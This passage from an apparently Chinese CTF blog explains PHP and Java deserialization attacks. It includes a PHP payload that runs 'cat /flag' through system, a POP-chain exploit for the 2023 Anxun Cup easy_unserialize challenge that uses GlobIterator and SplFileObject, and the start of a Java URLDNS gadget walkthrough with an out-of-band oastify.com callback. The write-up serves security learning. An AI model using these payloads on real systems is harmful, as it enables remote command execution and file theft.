<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;&amp;a=<span class="hljs-built_in">Error</span>&amp;b=systemcat /flag&amp;d=<span class="hljs-number">7</span>&amp;e=<span class="hljs-number">6</span>&amp;f=<span class="hljs-number">13</span>&amp;g=<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png"></p>
<hr>
<h2 id="2023安洵杯easy-unserialize"><a href="#2023安洵杯easy-unserialize" class="headerlink" title="2023安洵杯easy_unserialize"></a>2023安洵杯easy_unserialize</h2><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;gg2))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;gg2)<br>            &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;g1-&gt;g1=<span class="hljs-number">666</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ll2-&gt;<span class="hljs-title function_ invoke__">ll2</span>(<span class="hljs-string">&#x27;b2&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;arg1)===<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;tt2-&gt;tt2)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;what are you doing?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;<br>            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;D0g3&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;D0g3&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>注意到Flag类中有__invoke()方法，当一个Flag类对象被当作方法来调用时会自动触发__invoke()，__invoke()方法下存在一个函数array_walk()，将Flag对象中的成员作为参数传入一个回调函数中。变量值为第一个参数变量名为第二个参数,eg：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152115919.png"></p>
<p>题目代码中存在语句：，new一个对象并输出很容易想到php原生类的利用。因此将其作为poc链的终点</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152231540.png"></p>
<p>那么想触发__invoke()就需要将一个Flag对象作为方法来调用，注意到Luck类的__toString()方法中存在可控方法的调用</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104170635067.png"></p>
<p>触发__toString()方法的条件为当Luck对象被当作字符串处理时（与字符串拼接，打印出来，以及编码，正则匹配等等操作都会自动调用），这里有两处编码，一处是To类中___call()方法中，一处是Luck类中__unset()方法下的md5()处。但是__call()方法的触发需要调用一个类中不存在的方法，需要满足两个条件，类可控，调用方法可控，代码中不存在满足条件的方法。而__unset()方法，需要在对未定义成员或者私有属性调用unset()方法时触发，注意到You类的__wakeup()方法下正好有个unset()方法。</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104172505250.png"></p>
<p>至此poc链形成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">You::__wakeup()-&gt;Luck::__unset()-&gt;Luck::__toString-&gt;Flag::__invoke()<br></code></pre></td></tr></table></figure>

<p>使用GlobIterator原生类构造poc(列出目录)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$GlobIterator</span> = <span class="hljs-string">&quot;/*&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;<br>            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><br><span class="hljs-variable">$luck</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>();<br><span class="hljs-variable">$luck</span>-&gt;l1 = <span class="hljs-variable">$flag</span>;<br><br><span class="hljs-variable">$luck1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>();<br><span class="hljs-variable">$luck1</span>-&gt;md5 = <span class="hljs-variable">$luck</span>;<br><br><span class="hljs-variable">$you</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();<br><span class="hljs-variable">$you</span>-&gt;y1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();<br><span class="hljs-variable">$you</span>-&gt;y1-&gt;y1 = <span class="hljs-variable">$luck1</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$you</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O%3A3%3A%22You%22%3A1%3A%7Bs%3A2%3A%22y1%22%3BO%3A3%3A%22You%22%3A1%3A%7Bs%3A2%3A%22y1%22%3BO%3A4%3A%22Luck%22%3A2%3A%7Bs%3A2%3A%22l1%22%3BN%3Bs%3A3%3A%22md5%22%3BO%3A4%3A%22Luck%22%3A2%3A%7Bs%3A2%3A%22l1%22%3BO%3A4%3A%22Flag%22%3A1%3A%7Bs%3A12%3A%22GlobIterator%22%3Bs%3A2%3A%22%2F%2A%22%3B%7Ds%3A3%3A%22md5%22%3BN%3B%7D%7D%7D%7D<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173755984.png"></p>
<p>再使用SplFileObject原生类读取文件：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173931280.png"></p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173915503.png"></p>
<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//序列化：</span><br>ObjectOutputStream<br><span class="hljs-comment">//反序列化：</span><br>ObjectInputStream<br></code></pre></td></tr></table></figure>

<p>序列化过程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src/main/java/com/test/serializetest/file/wow.dat&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>反序列化过程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>被序列化的类需要使用Serializable接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test.serializetest;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123; name : &#x27;&quot;</span>+name+<span class="hljs-string">&quot;&#x27; ; age : &quot;</span>+age+<span class="hljs-string">&quot; &#125;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>transient关键字修饰的不会被序列化</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019013247721.png"></p>
<p>可能的情况：</p>
<p>入口类<code>readObject()</code>方法直接调用危险函数(极小概率。实际开发没有人会闲着没事)</p>
<p>重写<code>readObject()</code>方法，写入危险函数(反序列化靶场1：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019204338159.png"></p>
<p>序列化一个Person对象后将其反序列化，弹窗计算器</p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS:"></a>URLDNS:</h2><p>一个很完美的入口类：<code>HashMap</code></p>
<p>它继承了Serializable接口，用于序列化操作：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012846629.png"></p>
<p><code>HashMap</code>类重写了<code>readObject()</code>方法，这是必要的</p>
<p>我们跟进<code>HashMap</code>类：</p>
<p>进到<code>HashMap</code>重写的<code>readObject()</code>方法，注意到调用了<code>hash()</code>方法：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010227415.png"></p>
<p>跟进到<code>hash()</code>方法内，并在传入的对象不为null时调用<code>hashCode()</code>方法：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010725181.png"></p>
<p>跟进hashCode()方法：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021011511542.png"></p>
<p>直接来到了Object类的hashCode()函数；至此，HashMap类我们需要利用到的链已经梳理清楚了，我们接下来寻找另一个可利用类：URL，URL类是Java的net包中提供的一个用于进行网络请求的类，内置很多的请求方法。</p>
<p>继承了Serializable接口，nice！</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012716791.png"></p>
<p>有个hashCode()方法，这里有个注意点在于黄色框框内的条件，如果hashCode的值不为-1，那么直接返回hashCode值而不执行下面的handler.hashCode()，那我们继续跟进hashCode()</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014204061.png"></p>
<p>这里有个getHostAddress()方法：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014539958.png"></p>
<p>getHostAddress()-&gt;getByName()，就是获取一个请求域名的ip地址，那就必然会触发dns解析，可以作为黑盒时反序列化存在验证的特征</p>
<p><img src="/image-20231021014828001.png"></p>
<p>在HashMap中的<code>hashCode()</code>方法可以走到URL的<code>hashCode()</code>方法中</p>
<p>调用如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9fph4lv8yyoc7whmcdbzs13j8ae32tqi.oastify.com&quot;</span>),<span class="hljs-number">1</span>);<br>    Serialize. Serialize(hashMap);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>按理来说在序列化过程中并不会调用readObject()方法，不会触发DNS解析，可是实际上却是收到了来自hook的请求：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022155742899.png"></p>
<p>问题是出在了put()方法上，查看put的代码：</p>
<p>显而易见，在put()时就已经调用了hash()方法(为确保键的唯一性)：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160100214.png"></p>
<p>而hash()方法调用了hashCode()方法，就导致不需要经过反序列化readObject()方法就可以调用URL的hashCode()方法，理解了这个之后我们会发现只需要到put()这一步就可以触发hashCode()了，那必然会对我们URLDNS探测反序列化漏洞造成混淆：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160209274.png"></p>
<p>那么对一个已经序列化好的对象反序列化呢？能否触发readObject()方法呢？答案是不行的，在对URL进行分析时我们上面注意到，只有当hashCode值为-1时才执行handler.hashCode()，</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022203901385.png"></p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022172803715.png"></p>
<p>同时类里定义了hashCode初始值为-1</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022173034403.png"></p>
<p>在反序列化过程中由于我们的hashmap对象put了一个URL-&gt;Integer键值对，在URL::hashCode()方法中，如果hashCode为-1时，是会执行hashCode &#x3D; handler.hashCode(this)语句从而改变hashCode的值，不再为-1</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023182039564.png"></p>
